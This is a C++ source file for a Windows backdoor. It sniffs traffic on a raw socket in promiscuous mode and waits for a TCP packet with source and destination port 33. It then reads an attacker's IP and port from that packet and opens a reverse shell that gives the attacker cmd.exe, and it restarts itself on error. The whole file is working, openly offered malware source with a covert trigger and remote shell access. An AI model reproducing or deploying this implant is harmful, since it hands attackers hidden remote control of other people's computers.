// RawSocket.cpp : Triggers based off a src & dst port pairing and sends a reverse shell
//

#include <stdlib.h>
#include <stdio.h>
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <mstcpip.h>

// required for winsock2
#pragma comment(lib,"Ws2_32")

// define the const maximum size of a receive packet
constexpr auto MAX_PACKET_SIZE = 65535;

// struct for the ip header data
typedef struct _IP_HEADER_
{
	BYTE ver_ihl;
	BYTE type;
	WORD length;
	WORD packet_id;
	WORD flags_foff;
	BYTE ttl;
	BYTE proto;
	WORD hdr_chksum;
	DWORD src_ip;
	DWORD dst_ip;
} IPHEADER;

// struct for the tcp header data
typedef struct _TCP_HEADER_
{
	WORD sport;
	WORD dport;
	DWORD seq;
	DWORD ack;
	WORD info_ctl;
	WORD window;
	WORD checksum;
	WORD urgent;
} TCPHEADER;

// custom struct for the callback data
struct CDATA
{
	unsigned char port[2];
	unsigned char addr[4]; 
};

// prototypes
void	reverse_shell(unsigned int IP_ADDR, unsigned short PORT);
int		start_listener(void);

/* Function that establishes a reverse shell socket and then
	hands it off to the newly created process.*/
void
reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
{
	SOCKET s;
	struct sockaddr_in c_addr;
	STARTUPINFOA sui;
	PROCESS_INFORMATION pi;

	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	c_addr.sin_family = AF_INET;
	c_addr.sin_port = PORT;
	c_addr.sin_addr.s_addr = IP_ADDR;

	// connect to the attacker
	WSAConnect(s, (SOCKADDR*)&c_addr, sizeof(c_addr), NULL, NULL, NULL, NULL);

	// windows version of a dup2
	memset(&sui, 0, sizeof(sui));
	sui.cb = sizeof(sui);
	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)s;

	// Create a new process that will have the socket for its stdin/out/err 
	CHAR command[256] = "cmd.exe";
	CreateProcessA(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);

	// Avoid leaking memory 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

}

/* Starts the Raw Socket Listener that waits for the specified
	trigger mechanism. This then retrieves the callback info
	and calls the reverse shell.*/
int 
start_listener(void)
{
	SOCKET sock = INVALID_SOCKET;
	IPHEADER *ip_header = NULL;
	TCPHEADER *tcp_hdr = NULL;
	struct CDATA *cdata = NULL;
	WSADATA wsaData;
	DWORD dwFlags = WSA_FLAG_OVERLAPPED;
	DWORD dwLen = 0;
	int wsaResult = 0;
	int optval = 1;
	int bytes = 0;
	char* packet;

	// Required in order to initialize and gain access to winsock.dll
	wsaResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (wsaResult != 0) 
		return -1;

	// create a raw socket 
	sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_IP, NULL, 0, dwFlags);
	if (sock == INVALID_SOCKET) 
		return -1;

	sockaddr_in sniffer;
	sniffer.sin_family = AF_INET;
	sniffer.sin_port = htons(0);
	sniffer.sin_addr.s_addr = inet_addr("192.168.1.134");

	if (bind(sock, (SOCKADDR*)&sniffer, sizeof(sniffer)) == SOCKET_ERROR)
		return -1;

	// this function sets the interface to promiscuous mode
	if (WSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwLen, NULL, NULL) == SOCKET_ERROR)
		goto close;

	// allocate memory in the heap for handling each packet at a time
	if ((packet = (char*)malloc(sizeof(char) * MAX_PACKET_SIZE)) == NULL)
		goto close;

	// enter listener while loop and call reverse_shell on trigger
	while (TRUE)
	{
		memset(packet, 0x00, sizeof(MAX_PACKET_SIZE));

		if (bytes = recv(sock, packet, MAX_PACKET_SIZE, 0) == SOCKET_ERROR) 
			break;

		ip_header = (IPHEADER*)packet;

		// handle the TCP packets
		if (ip_header->proto == 6) {

			int iphdr_len = (ip_header->ver_ihl & 0xf) * sizeof(DWORD);
			tcp_hdr = (TCPHEADER*)(packet + iphdr_len);
			
			// Trigger based off of a source and destination port pairing
			if (htons(tcp_hdr->dport) == 33 && htons(tcp_hdr->sport) == 33) {

				cdata = (struct CDATA*)(packet + iphdr_len + sizeof(TCPHEADER));

				unsigned short port;
				unsigned int   ip;

				//bit shifting to build the return port/IP
				port = (cdata->port[1] << 8) + (cdata->port[0]);
				ip =  (cdata->addr[3] << 24);
				ip += (cdata->addr[2] << 16);
				ip += (cdata->addr[1] << 8);
				ip += (cdata->addr[0]);

				free(packet);
				shutdown(sock, SD_BOTH);
				closesocket(sock);
				reverse_shell(ip, port);

				return 0;

			}
		}
	}
	free(packet);
close:
	shutdown(sock, SD_BOTH);
	closesocket(sock);

	return -1;
}

int
main(void)
{
	int err = 0;
	while (TRUE) {
		
		err = start_listener();
		// if we have an error in the program, wait 30 seconds and try again
		if (err == -1)
			Sleep(30000);
	}
	return 0;
}


